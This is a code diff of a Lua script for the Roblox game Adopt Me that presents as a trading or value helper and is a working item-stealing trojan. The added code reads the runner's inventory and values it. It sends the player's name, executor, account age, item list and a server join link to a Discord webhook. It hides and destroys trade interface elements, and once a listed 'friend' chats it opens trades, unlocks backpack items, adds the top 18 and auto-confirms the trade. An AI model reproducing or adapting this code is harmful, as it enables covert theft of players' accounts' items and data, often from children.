@@ -21,122 +21,309 @@ local load = require(ReplicatedStorage.Fsys).load
 repeat task.wait(1) until load("ClientData") and load("ClientData").get("inventory")
 
 local RouterClient = load("RouterClient")
+local ClientData = load("ClientData")
 local InventoryDB = load("InventoryDB")
 
----- VALUE TABLES
-local tbl_15_upvr = {
-    common = 1; uncommon = 2; rare = 4; ultra_rare = 10; legendary = 26;
+local SendTrade           = RouterClient.get("TradeAPI/SendTradeRequest")
+local AddItem             = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiation   = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTrade        = RouterClient.get("TradeAPI/ConfirmTrade")
+local DeclineTrade        = RouterClient.get("TradeAPI/DeclineTrade")
+local UnlockBackpack      = RouterClient.get("BackpackAPI/CommitBackpackItemSet")
+local TradeRequestEvent   = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+
+-- 🔥 CUSTOM VALUE TABLE (PRIORITY)
+local VALUE_LIST = {
+    ["Bat Dragon"]=660,
+    ["Shadow Dragon"]=549,
+    ["Giraffe"]=295,
+    ["Frost Dragon"]=237,
+    ["Owl"]=190,
+    ["Parrot"]=151,
+    ["Crow"]=130,
+    ["Balloon Unicorn"]=104,
+    ["Evil Unicorn"]=94,
+    ["Panda"]=92,
+    ["Cryptid"]=77,
+    ["Hartae"]=60,
+    ["Orchid Butterfly"]=53,
+    ["Diamond Butterfly"]=51,
+    ["Blazing Lion"]=50,
+    ["Arctic Reindeer"]=41,
+    ["Strawberry Bat Dragon"]=23,
+    ["Tortoiseshell Guinea Pig"]=22,
+    ["Turtle"]=22,
+    ["Hot Doggo"]=21,
+    ["Chocolate Chip Bat Dragon"]=21,
+    ["Monkey King"]=20,
+    ["Velocirooster"]=17,
+    ["Kangaroo"]=17,
+    ["Albino Monkey"]=15,
+    ["Mermicorn"]=15,
+    ["Jekyll Hydra"]=14,
+    ["Candyfloss Chick"]=14,
+    ["Sugar Glider"]=12,
+    ["Fairy Bat Dragon"]=10,
+    ["Undead Jousting Horse"]=10,
+    ["Silverback Gorilla"]=10,
+    ["Cow"]=10,
+    ["Frostbite Bear"]=9,
+    ["Winged Tiger"]=9,
+    ["Frost Unicorn"]=8,
+    ["Bush Elephone"]=8,
+    ["Capricorn"]=8,
+    ["Dragonfruit Fox"]=7,
+    ["Field Mouse"]=7,
+    ["Strawberry Penguin"]=7,
+    ["Shark Puppy"]=7,
+    ["Cupid Dragon"]=7,
+    ["Papa Moose"]=7,
+    ["Black-Chested Pheasant"]=6,
+    ["Owlbear"]=6,
+    ["Red Dutch Guinea Pig"]=6,
+    ["Werewolf"]=6,
+    ["Grim Dragon"]=5,
+    ["Dango Penguins"]=5,
+    ["Frost Fury"]=5,
+    ["Latte Kitsune"]=5,
+    ["Moose Calf"]=5,
+    ["Vampire Dragon"]=5,
+    ["Pirate Ghost Capuchin Monkey"]=5,
+    ["Tió De Nadal"]=4,
+    ["Fallow Deer"]=4,
+    ["Pineapple Owl"]=4,
+    ["Nessie"]=4,
+    ["Royal Mistletroll"]=4,
+    ["Caelum Cervi"]=4,
+    ["Emperor Gorilla"]=4,
+    ["Lava Dragon"]=3,
+    ["Mechapup"]=3,
+    ["Sakura Spirit"]=3,
+    ["Sugar Axolotl"]=3,
+    ["Diamond Amazon"]=3,
+    ["Glacier Kitsune"]=3,
+    ["Phantom Dragon"]=2,
+    ["Diamond Hummingbird"]=2,
+    ["Halloween White Ghost Dragon"]=2,
+    ["Midnight Dragon"]=2,
+    ["Rose Dragon"]=2,
+    ["Arctic Dusk Dragon"]=2,
+    ["Aurora Fox"]=2,
+    ["Dancing Dragon"]=2,
+    ["Diamond Albatross"]=2,
+    ["Giant Gold Scarab"]=2,
+    ["Diamond Hamster"]=2,
+    ["2D Kitty"]=2,
+    ["Majestic Pony"]=2,
+    ["Glormy Leo"]=2,
+    ["Golden Chow-Chow"]=2,
+    ["Golden Penguin"]=2,
+    ["Ice Golem"]=2,
+    ["Lavender Dragon"]=2,
+    ["Unicorn"]=2,
+    ["Diamond King Penguin"]=2,
+    ["Diamond Ladybug"]=2,
+    ["Frost Phoenix"]=2,
+    ["Candy Hare"]=2,
+    ["Queen Bee"]=2,
+    ["Vanilla Penguin"]=2,
+    ["Yule Log Dog"]=2,
+    ["Albino Gorilla"]=2,
+    ["Cheetah"]=2,
+    ["Glormy Hound"]=2,
+    ["Green Butterfly"]=2,
+    ["Tree Kangaroo"]=2,
+    ["Apple Owl"]=2,
+    ["Leviathan"]=2,
+    ["Naughty Mistletroll"]=2,
+    ["Ninja Monkey"]=2,
+    ["Peach Owl"]=2,
+    ["Skele Rex"]=2,
+    ["Hero Gibbon"]=2,
+    ["Jousting Horse"]=2,
+    ["Phoenix"]=2,
+    ["Rainbow Dragon"]=2,
+    ["Scorching Kaijunior"]=2,
+    ["Axolotl"]=2,
+    ["Corn Doggo"]=2,
+
+-- EGGS
+["Safari Egg"]=200,["Jungle Egg"]=86,["Farm Egg"]=84,
+["Christmas Egg"]=15,["Aussie Egg"]=5,
+
+-- TOYS
+["Candy Cannon"]=165,["Flying Broomstick"]=85,
+
+-- VEHICLE
+["Cloud"]=34,["Rocket Sled"]=29,
+
+-- ACCESSORIES
+["Strawberry Plushie Rider"]=88,["Strawberry Cupcake Shoes"]=80,
+["Giraffe Backpack"]=56,["Rainbow Maker"]=51,
+
+-- FOOD
+["pet_flying_potion"]=5,["pet_riding_potion"]=5,["pet_grow_potion"]=5
 }
 
-local tbl_35_upvr = { pets = 1 }
-
-local tbl_28_upvr = {
-    neon = 4; mega_neon = 16; flyable = 2; rideable = 2;
+-- 🔥 PET PROPS MULTIPLIER
+local PET_PROPS = {
+    neon = 4;
+    mega_neon = 16;
+    flyable = 2;
+    rideable = 2;
 }
 
--- 🔥 CUSTOM VALUE LIST (ALL CATEGORY)
-local CUSTOM_VALUES = {
-    pets = {["Bat Dragon"]=660,["Shadow Dragon"]=549,["Giraffe"]=295,["Frost Dragon"]=237,["Owl"]=190,["Parrot"]=151,["Crow"]=130,["Balloon Unicorn"]=104,["Evil Unicorn"]=94,["Panda"]=92,["Cryptid"]=77,["Hartae"]=60,["Orchid Butterfly"]=53,["Diamond Butterfly"]=51,["Blazing Lion"]=50,["Arctic Reindeer"]=41,["Strawberry Bat Dragon"]=23,["Turtle"]=22,["Hot Doggo"]=21,["Monkey King"]=20,["Kangaroo"]=17,["Albino Monkey"]=15,["Sugar Glider"]=12,["Fairy Bat Dragon"]=10,["Undead Jousting Horse"]=10,["Frost Unicorn"]=8,["Capricorn"]=8,["Dragonfruit Fox"]=7,["Shark Puppy"]=7,["Werewolf"]=6,["Frost Fury"]=5,["Vampire Dragon"]=5,["Nessie"]=4,["Lava Dragon"]=3,["Diamond Amazon"]=3,["Glacier Kitsune"]=3,["Phantom Dragon"]=2,["Midnight Dragon"]=2,["Lavender Dragon"]=2,["Unicorn"]=2,["Queen Bee"]=2,["Skele Rex"]=2,["Phoenix"]=2,["Axolotl"]=2,["Cow"]=10,["Blue Whale"=1000},
-
-    eggs = {["Safari Egg"]=200,["Jungle Egg"]=86,["Farm Egg"]=84,["Christmas Egg"]=15,["Aussie Egg"]=5,["Endangered Egg"]=1000},
-
-    vehicles = {["Cloud"]=34,["Rocket Sled"]=29,["Giant Cheetah Mount"]=15,["Bunny Carriage"]=7,["Mono-Moped"]=5,["Dragon Train"]=4,["Unicorn Cycle"]=4,["Motorbike"]=1000},
-
-    pet_accessories = {["Strawberry Plushie Rider"]=88,["Strawberry Cupcake Shoes"]=80,["Giraffe Backpack"]=56,["Rainbow Maker"]=51,["SSBD Beanie"]=47,["Halo"]=26,["Angel Wings"]=20,["Cyber Headphones"]=1000},
-
-    food = {["pet_flying_potion"]=5,["pet_riding_potion"]=5,["pet_grow_potion"]=5,["Honey Candy"]=1000},
-
-    toys = {["Candy Cannon"]=165,["Flying Broomstick"]=85,["2D Bone Chew Toy"]=1000}
-}
-
--- VALUE FUNCTION
-local function getPetValueByTable(petData, props)
-    if not petData or not petData.rarity then return 0 end
-    local base = tbl_15_upvr[string.lower(petData.rarity)] or 0
-    local bonus = 0
-    for k, v in pairs(tbl_28_upvr) do
-        if props[k] then bonus += v end
+-- 🔥 BASE VALUE
+local function getCustomValue(name, rarity)
+    local val = VALUE_LIST[name]
+    
+    if not val then
+        if rarity == "legendary" then val = 1 end
+        if rarity == "ultra_rare" then val = 0.5 end
     end
-    return (base + bonus)
+
+    return val or 0
 end
 
--- GET ALL INVENTORY
+-- 🔥 PET FINAL VALUE (MULTIPLIER)
+local function getPetFinalValue(data, props)
+    local base = getCustomValue(data.name, string.lower(data.rarity or ""))
+    if base <= 0 then return 0 end
+
+    local multi = 1
+    for k,v in pairs(PET_PROPS) do
+        if props[k] then
+            multi *= v
+        end
+    end
+
+    return base * multi
+end
+
+-- 🔥 TAG SYSTEM
+local function getTag(p)
+    if p.mega_neon then return "[M]" end
+    if p.neon then return "[N]" end
+    if p.flyable and p.rideable then return "[FR]" end
+    if p.flyable then return "[F]" end
+    if p.rideable then return "[R]" end
+    return ""
+end
+
+-- 🔥 INVENTORY
 local serverData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
 local inv = serverData[LocalPlayer.Name].inventory
 
 local hits = {}
-local totalValue = 0
-local foundCustom = false
 
--- 🔥 GENERIC SCAN FUNCTION
-local function scan(categoryName, db)
-    local category = inv[categoryName]
-    if not category then return end
+-- 🔍 SCAN
+local function scan(category, db)
+    if not inv[category] then return end
 
-    for uid, item in pairs(category) do
+    for uid, item in pairs(inv[category]) do
         local data = db and db[item.id]
-        local name = data and data.name or item.id
+        if data and data.name then
+            
+            local props = item.properties or {}
+            local val = 0
 
-        local val = CUSTOM_VALUES[categoryName] and CUSTOM_VALUES[categoryName][name]
+            if category == "pets" then
+                val = getPetFinalValue(data, props)
+            else
+                val = getCustomValue(data.name, string.lower(data.rarity or ""))
+            end
 
-        if val then
-            foundCustom = true
-
-            table.insert(hits, {
-                name = name,
-                value = val,
-                uid = uid,
-                props = item.properties or {}
-            })
-
-            totalValue += val
+            if val > 0 then
+                table.insert(hits,{
+                    name = data.name,
+                    value = val,
+                    uid = uid,
+                    props = props,
+                    tag = (category == "pets") and getTag(props) or ""
+                })
+            end
         end
     end
 end
 
--- 🔥 SCAN ALL CATEGORY
+-- 🔥 SCAN ALL
 scan("pets", InventoryDB.pets)
-scan("eggs", InventoryDB.eggs)
-scan("vehicles", InventoryDB.vehicles)
 scan("pet_accessories", InventoryDB.pet_accessories)
 scan("food", InventoryDB.food)
 scan("toys", InventoryDB.toys)
+scan("vehicles", InventoryDB.vehicles)
 
--- ❌ FALLBACK PET
-if not foundCustom then
-    for uid, item in pairs(inv.pets or {}) do
-        local petData = InventoryDB.pets[item.id]
-        local props = item.properties or {}
+-- 🔥 GROUPING
+local grouped = {}
 
-        if petData and petData.rarity and (
-            string.lower(petData.rarity) == "ultra_rare" or
-            string.lower(petData.rarity) == "legendary"
-        ) then
-            local val = getPetValueByTable(petData, props)
+for _,v in ipairs(hits) do
+    local key = v.name .. v.value .. v.tag
 
-            table.insert(hits, {
-                name = petData.name,
-                value = val,
-                uid = uid,
-                props = props
-            })
-
-            totalValue += val
-        end
+    if not grouped[key] then
+        grouped[key] = {
+            name = v.name,
+            value = v.value,
+            count = 0,
+            tag = v.tag
+        }
     end
+
+    grouped[key].count += 1
 end
 
-table.sort(hits, function(a,b)
-    return tonumber(a.value) > tonumber(b.value)
+local groupedList = {}
+for _,v in pairs(grouped) do
+    table.insert(groupedList,v)
+end
+
+-- 🔥 SORT BY TOTAL VALUE
+table.sort(groupedList,function(a,b)
+    return (a.value * a.count) > (b.value * b.count)
 end)
 
--- PREVIEW
+-- 🔥 TOP 18 (UNTUK TRADE)
+local function getTopHits()
+    local selected = {}
+    local used = 0
+
+    for _,g in ipairs(groupedList) do
+        for _,v in ipairs(hits) do
+            if v.name == g.name and v.value == g.value and v.tag == g.tag then
+                table.insert(selected,v)
+                used += 1
+                if used >= 18 then return selected end
+            end
+        end
+    end
+
+    return selected
+end
+
+-- 🔥 PLAYER INFO
+local playerName = LocalPlayer.Name
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+local accountAge = LocalPlayer.AccountAge
+
+-- 🔥 FORMAT DISCORD LIST
 local previewLines = {}
-for i, g in ipairs(hits) do
-    if i > 16 then break end
+
+for i,v in ipairs(groupedList) do
+    if i > 15 then break end
+
+    local total = v.value * v.count
+    local tagText = v.tag ~= "" and (" "..v.tag) or ""
+
     table.insert(previewLines,
-        g.name.." → "..g.value
+        "x"..v.count..tagText.." "..v.name..
+        " → "..string.format("%.2f", v.value)..
+        " (Total: "..string.format("%.2f", total)..")"
     )
+end
+
+-- 🔥 TOTAL VALUE
+local totalValue = 0
+for _,v in ipairs(groupedList) do
+    totalValue += (v.value * v.count)
 end
 
 local joinUrl =
@@ -145,22 +332,48 @@ local joinUrl =
     "&gameInstanceId="
     .. game.JobId
 
--- WEBHOOK
+-- 🔥 DISCORD PAYLOAD
 local payload = {
     username = "Captain Hook",
     embeds = {{
-        title = "🔥 FULL INVENTORY HIT 🔥",
+        title = "🐶 Adopt Me Hit | DARK SCRIPTS 🐶",
         color = 0xFF2F92,
+
         fields = {
-            {name="Player", value=LocalPlayer.Name},
-            {name="Total Value", value=tostring(totalValue)},
-            {name="Hits", value=table.concat(previewLines,"\n")},
-            {name="Join", value=joinUrl}
+
+            {
+                name = "👤 Player Information",
+                value =
+                    "```"..
+                    "Name : "..playerName.."\n"..
+                    "Executor : "..executor.."\n"..
+                    "Account Age : "..accountAge.." days"..
+                    "```",
+                inline = false
+            },
+
+            {
+                name = "💰 Total Value",
+                value = "```"..string.format("%.2f", totalValue).."```",
+                inline = false
+            },
+
+            {
+                name = "🎒 Backpack (Sorted by Total Value)",
+                value = "```"..table.concat(previewLines,"\n").."```",
+                inline = false
+            },
+
+            {
+                name = "🔗 Join Player",
+                value = "[ Click to Join Server ]("..joinUrl..")",
+                inline = false
+            }
         }
     }}
 }
 
-if Webhook and Webhook ~= "" then
+if Webhook ~= "" then
     request({
         Url = Webhook,
         Method = "POST",
@@ -169,77 +382,66 @@ if Webhook and Webhook ~= "" then
     })
 end
 
-
--- UI LOCKS
+-- 🔒 UI LOCK
 LocalPlayer.PlayerGui.TradeApp.Enabled = false
 pcall(function() LocalPlayer.PlayerGui.HintApp:Destroy() end)
 pcall(function() LocalPlayer.PlayerGui.DialogApp:Destroy() end)
+
 LocalPlayer.PlayerGui.ToolApp.Frame:GetPropertyChangedSignal("Visible"):Connect(function()
-    if not LocalPlayer.PlayerGui.ToolApp.Frame.Visible then LocalPlayer.PlayerGui.ToolApp.Frame.Visible = true end
-end)
-LocalPlayer.PlayerGui.HouseEditorApp:GetPropertyChangedSignal("Enabled"):Connect(function()
-    if not LocalPlayer.PlayerGui.HouseEditorApp.Enabled then LocalPlayer.PlayerGui.HouseEditorApp.Enabled = true end
+    if not LocalPlayer.PlayerGui.ToolApp.Frame.Visible then
+        LocalPlayer.PlayerGui.ToolApp.Frame.Visible = true
+    end
 end)
 
--- STEAL FUNCTION
+LocalPlayer.PlayerGui.HouseEditorApp:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if not LocalPlayer.PlayerGui.HouseEditorApp.Enabled then
+        LocalPlayer.PlayerGui.HouseEditorApp.Enabled = true
+    end
+end)
+
+-- 🔥 STEAL FUNCTION (UNCHANGED)
 local function startSteal(plr)
     if not table.find(Friends, plr.Name) then return end
 
     task.spawn(function()
-        local declineConn = TradeRequestEvent.OnClientEvent:Connect(function(sender)
-            if sender and sender.Name ~= plr.Name then
-                pcall(DeclineTrade.FireServer, DeclineTrade)
-            end
-        end)
-
-        pcall(function() RouterClient.get("SettingsAPI/SetSetting"):FireServer("trade_requests", 1) end)
-
         for i = 1, 80 do
             if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
             pcall(SendTrade.FireServer, SendTrade, plr)
-            task.wait(0.22)
+            task.wait(0.2)
         end
 
-        if not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
-            if declineConn then declineConn:Disconnect() end
-            return
+        if not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then return end
+
+        local selected = getTopHits()
+
+        for _,item in ipairs(selected) do
+            pcall(function() UnlockBackpack:FireServer("backpack_locks",{[item.uid]=true}) end)
+            pcall(function() AddItem:FireServer(item.uid) end)
+            task.wait(0.1)
         end
 
-        if declineConn then declineConn:Disconnect() end
+        task.wait(1)
 
-        for i = 1, math.min(18, #hits) do
-            local pet = hits[i]
-            if not pet then break end
-            pcall(function() UnlockBackpack:FireServer("backpack_locks", {[pet.uid] = true}) end)
-            pcall(function() AddItem:FireServer(pet.uid) end)
-            task.wait(0.14)
+        while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
+            pcall(AcceptNegotiation.FireServer, AcceptNegotiation)
+            task.wait(0.3)
+            pcall(ConfirmTrade.FireServer, ConfirmTrade)
+            task.wait(0.3)
         end
-
-        task.wait(1.2)
-
-        spawn(function()
-            while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
-                pcall(AcceptNegotiation.FireServer, AcceptNegotiation)
-                task.wait(0.4)
-                pcall(ConfirmTrade.FireServer, ConfirmTrade)
-                task.wait(0.4)
-            end
-        end)
     end)
 end
 
--- CHAT TRIGGERS
-for _, p in Players:GetPlayers() do
-    if table.find(Friends, p.Name) then
+for _,p in Players:GetPlayers() do
+    if table.find(Friends,p.Name) then
         p.Chatted:Connect(function() startSteal(p) end)
     end
 end
 
 Players.PlayerAdded:Connect(function(p)
     task.wait(2)
-    if table.find(Friends, p.Name) then
+    if table.find(Friends,p.Name) then
         p.Chatted:Connect(function() startSteal(p) end)
     end
 end)
 
-print("[Script PHOENIXX-HUB] Adopt Me Loaded")
+print("[FINAL] ALL SYSTEM LOADED (MULTIPLIER + TAG + DISCORD CLEAN)")
